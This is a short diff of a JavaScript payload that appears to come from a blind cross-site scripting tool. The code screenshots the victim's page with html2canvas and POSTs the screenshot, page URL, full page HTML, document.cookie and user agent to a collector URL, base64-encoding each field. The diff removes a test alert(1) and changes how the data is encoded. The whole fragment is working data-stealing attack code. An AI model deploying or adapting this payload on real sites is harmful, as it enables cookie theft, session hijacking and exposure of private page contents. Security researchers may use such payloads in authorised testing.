@@ -7,7 +7,7 @@ r.forEach(function(e){try{n.style[e]=t.css(e)}catch(r){E("html2canvas: Parse: Ex
 html2canvas(document.body).then(function(canvas) {
  	collected_data['SCREENSHOT'] = canvas.toDataURL();
  	send_informations();
- 	alert(1);
+ 	
 });
 
 
@@ -17,11 +17,11 @@ function send_informations(){
 	var http = new XMLHttpRequest();
 
 	http.open("POST", url, true);
-	http.setRequestHeader("Content-type", "text/plain");
-	http.send("screenshot="+JSON.stringify(collected_data['SCREENSHOT'])
-		+"&url="      + JSON.stringify(window.location.href)
-		+"&domhtml="  + JSON.stringify(document.getElementsByTagName('html')[0].innerHTML)
-		+"&cookie="   + JSON.stringify(document.cookie)
-		+"&useragent="+ JSON.stringify(navigator.userAgent)
+	http.setRequestHeader("Content-type", "application/x-www-form-urlencoded");
+	http.send("screenshot="+escape(btoa(collected_data['SCREENSHOT']))
+		+"&url="      + escape(btoa(window.location.href))
+		+"&domhtml="  + escape(btoa(document.getElementsByTagName('html')[0].innerHTML))
+		+"&cookie="   + escape(btoa(document.cookie))
+		+"&useragent="+ escape(btoa(navigator.userAgent))
 		);
 }
